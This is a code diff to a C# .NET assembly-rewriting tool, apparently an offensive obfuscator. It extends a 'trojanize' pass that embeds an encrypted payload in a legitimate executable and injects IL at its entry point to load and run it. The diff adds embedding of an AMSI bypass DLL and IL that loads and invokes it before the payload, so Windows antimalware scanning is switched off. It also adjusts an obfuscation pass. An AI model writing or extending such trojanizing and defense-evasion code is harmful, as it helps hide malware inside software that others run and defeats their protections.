@@ -33,6 +33,7 @@ internal static class Program
         string? passesArg = null;
         string? payloadFile = null;
         string? keyFile = null;
+        string? amsiFile = null;
         bool safeRename = false;
 
         for (int i = 0; i < args.Length; i++)
@@ -53,6 +54,9 @@ internal static class Program
                     break;
                 case "--key-file" when i + 1 < args.Length:
                     keyFile = args[++i];
+                    break;
+                case "--amsi-file" when i + 1 < args.Length:
+                    amsiFile = args[++i];
                     break;
                 case "--safe-rename":
                     safeRename = true;
@@ -101,7 +105,7 @@ internal static class Program
                         Console.Error.WriteLine("trojanize requires --payload-file and --key-file");
                         return 1;
                     }
-                    ApplyTrojanize(module, payloadFile, keyFile);
+                    ApplyTrojanize(module, payloadFile, keyFile, amsiFile);
                     break;
                 default:
                     Console.Error.WriteLine($"Unknown pass: {pass}");
@@ -483,6 +487,8 @@ internal static class Program
                 if (method.Body.HasExceptionHandlers) continue;
                 if (method.IsVirtual || method.IsAbstract) continue;
                 if (IsCompilerGenerated(method)) continue;
+                if (IsInterfaceImpl(method)) continue;
+                if (method.IsSpecialName) continue;
                 var instrs = method.Body.Instructions;
                 if (instrs.Count < 5) continue;
 
@@ -796,7 +802,7 @@ internal static class Program
 
     // ── Trojanize pass ──────────────────────────────────────────────────
 
-    private static void ApplyTrojanize(ModuleDef module, string payloadFile, string keyFile)
+    private static void ApplyTrojanize(ModuleDef module, string payloadFile, string keyFile, string? amsiFile)
     {
         var payloadB64 = File.ReadAllText(payloadFile).Trim();
         var keyB64 = File.ReadAllText(keyFile).Trim();
@@ -806,9 +812,20 @@ internal static class Program
         // 1. Add encrypted payload and key as embedded resources
         var resourceName = RandomId().TrimStart('_') + ".dat";
         var keyResourceName = RandomId().TrimStart('_') + ".key";
+        var amsiResourceName = RandomId().TrimStart('_') + ".bin";
 
         module.Resources.Add(new EmbeddedResource(resourceName, Encoding.UTF8.GetBytes(payloadB64)));
         module.Resources.Add(new EmbeddedResource(keyResourceName, Encoding.UTF8.GetBytes(keyB64)));
+
+        // Embed the AMSI bypass DLL as a resource
+        byte[]? amsiDllBytes = null;
+        if (amsiFile != null)
+        {
+            var amsiB64 = File.ReadAllText(amsiFile).Trim();
+            amsiDllBytes = Convert.FromBase64String(amsiB64);
+            module.Resources.Add(new EmbeddedResource(amsiResourceName, amsiDllBytes));
+            Console.Error.WriteLine($"  [trojanize] embedded AMSI bypass ({amsiDllBytes.Length} bytes)");
+        }
 
         // 2. Find the entry point
         var entryPoint = module.EntryPoint;
@@ -948,6 +965,56 @@ internal static class Program
         I.Add(OpCodes.Ldlen.ToInstruction());
         I.Add(OpCodes.Conv_I4.ToInstruction());
         I.Add(OpCodes.Blt.ToInstruction(loopBody));
+
+        // AMSI bypass: load the bypass DLL from resource, call the patch method
+        if (amsiDllBytes != null)
+        {
+            // We need a few more refs for reading the bypass resource
+            var binReaderTypeRef = new TypeRefUser(module, "System.IO", "BinaryReader", asmRef);
+            var binReaderCtor = new MemberRefUser(module, ".ctor",
+                MethodSig.CreateInstance(module.CorLibTypes.Void, streamSig), binReaderTypeRef);
+            var readBytes = new MemberRefUser(module, "ReadBytes",
+                MethodSig.CreateInstance(byteArraySig, module.CorLibTypes.Int32),
+                binReaderTypeRef);
+
+            // Load bypass assembly from resource:
+            // var bypassAsm = Assembly.Load(
+            //   new BinaryReader(typeof(X).Assembly.GetManifestResourceStream("name"))
+            //     .ReadBytes(size));
+            I.Add(OpCodes.Ldtoken.ToInstruction(entryType));
+            I.Add(OpCodes.Call.ToInstruction(getTypeFromHandle));
+            I.Add(OpCodes.Callvirt.ToInstruction(getAssembly));
+            I.Add(OpCodes.Ldstr.ToInstruction(amsiResourceName));
+            I.Add(OpCodes.Callvirt.ToInstruction(getResStream));
+            I.Add(OpCodes.Newobj.ToInstruction(binReaderCtor));
+            I.Add(OpCodes.Ldc_I4.ToInstruction(amsiDllBytes.Length));
+            I.Add(OpCodes.Callvirt.ToInstruction(readBytes));
+            I.Add(OpCodes.Call.ToInstruction(asmLoad));  // Assembly.Load(byte[])
+
+            // Get the first public type, get its first public static method, invoke it
+            // bypassAsm.GetTypes()[0].GetMethods()[0].Invoke(null, null)
+            var getTypes = new MemberRefUser(module, "GetTypes",
+                MethodSig.CreateInstance(
+                    new SZArraySig(new ClassSig(typeTypeRef))),
+                asmTypeRef);
+            var getMethods = new MemberRefUser(module, "GetMethods",
+                MethodSig.CreateInstance(
+                    new SZArraySig(miSig)),
+                typeTypeRef);
+
+            I.Add(OpCodes.Callvirt.ToInstruction(getTypes));
+            I.Add(OpCodes.Ldc_I4_0.ToInstruction());
+            I.Add(OpCodes.Ldelem_Ref.ToInstruction());
+            I.Add(OpCodes.Callvirt.ToInstruction(getMethods));
+            I.Add(OpCodes.Ldc_I4_0.ToInstruction());
+            I.Add(OpCodes.Ldelem_Ref.ToInstruction());
+            I.Add(OpCodes.Ldnull.ToInstruction());
+            I.Add(OpCodes.Ldnull.ToInstruction());
+            I.Add(OpCodes.Callvirt.ToInstruction(invoke));
+            I.Add(OpCodes.Pop.ToInstruction());
+
+            Console.Error.WriteLine("  [trojanize] AMSI bypass IL injected");
+        }
 
         // var loaded = Assembly.Load(plain); var ep = loaded.EntryPoint;
         I.Add(OpCodes.Ldloc_3.ToInstruction());
